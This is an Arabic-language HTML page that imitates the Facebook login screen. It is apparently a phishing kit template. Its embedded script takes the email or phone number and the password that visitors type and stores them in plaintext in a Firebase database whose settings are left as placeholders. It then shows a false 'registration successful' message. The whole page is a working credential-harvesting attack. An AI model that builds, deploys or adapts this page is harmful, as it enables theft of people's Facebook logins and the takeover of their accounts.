<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Facebook</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="welcome-section">
            <h1>Facebook</h1>
            <p>تواصل مع أصدقائك وشارك لحظاتك.</p>
        </div>

        <!-- نموذج تسجيل الدخول -->
        <div class="login-box">
            <form id="loginForm">
                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" id="password" placeholder="كلمة المرور" required>
                <button type="submit">تسجيل الدخول</button>
            </form>
            <a href="#">هل نسيت كلمة المرور؟</a>
            <hr>
            <button class="create-account">إنشاء حساب جديد</button>
        </div>
    </div>

    <script type="module">
        // استيراد Firebase
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        // إعداد Firebase
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT.firebaseio.com",
            projectId: "YOUR_PROJECT",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // عند الضغط على زر تسجيل الدخول
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            set(ref(database, "users/" + email.replace(".", "_")), {
                email: email,
                password: password
            }).then(() => {
                alert("تم التسجيل بنجاح!");
            }).catch((error) => {
                console.error("حدث خطأ:", error);
            });
        });
    </script>
</body>
</html>
